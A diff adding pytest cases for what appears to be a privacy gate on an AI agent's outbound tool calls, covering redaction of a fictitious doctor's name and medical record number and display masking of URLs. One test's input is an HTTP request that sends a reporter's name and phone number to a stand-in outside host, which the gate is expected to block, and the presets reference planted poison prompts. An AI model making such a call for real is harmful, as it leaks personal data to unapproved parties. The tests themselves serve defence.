@@ -66,3 +66,29 @@ def test_presets_and_custom_validation(client):
     assert len(pres) >= 3 and all({"title", "prompt", "plant_poison"} <= set(p) for p in pres)
     assert client.post("/api/sessions", json={"scenario": "custom", "prompt": "  "}).status_code == 400
     assert client.post("/api/sessions", json={"scenario": "custom", "prompt": "x" * 2001}).status_code == 400
+
+
+def test_pharma_workspace(client):
+    names = {w["name"] for w in client.get("/api/workspaces").json()}
+    assert names == {"insurance", "pharma"}
+    pres = client.get("/api/presets?workspace=pharma").json()
+    assert pres and all("PV-26-0417" in p["prompt"] for p in pres)
+    assert client.get("/api/presets?workspace=nope").status_code == 422
+    # the safety cases are in the vault from startup: the doctor, hospital and MRN never reach Tavily
+    d = client.post("/api/inspect", json={"payload": {"query": "Dr. Wendy Notreal Brookfield University Hospital BUH-4471928 "
+                                                                 "amivantamab lazertinib pulmonary embolism prophylaxis"},
+                                          "private": True}).json()
+    sent = json.dumps(d["sent"])
+    assert d["action"] in ("rewrite", "redact") and "Notreal" not in sent and "4471928" not in sent and "Brookfield" not in sent
+    assert "amivantamab" in sent
+    # an outside "registry" gets nothing once a case has been read
+    d = client.post("/api/inspect", json={"channel": "http", "tool": "http.get", "destination": "ae-registry-sync.net",
+                                          "url": "https://ae-registry-sync.net/v1/report?reporter=Wendy%20Notreal&phone=555-019-8823",
+                                          "payload": {}, "private": True}).json()
+    assert d["action"] == "block" and d["sent"] is None and "not an approved destination" in d["reason"]
+
+
+def test_display_masking_decodes_urls(client):
+    from app.api import main
+    shown = main.gate().mask_text("https://x.example/r?reporter=Dr.%20Wendy%20Notreal&mrn=BUH-4471928")
+    assert "Notreal" not in shown and "4471928" not in shown
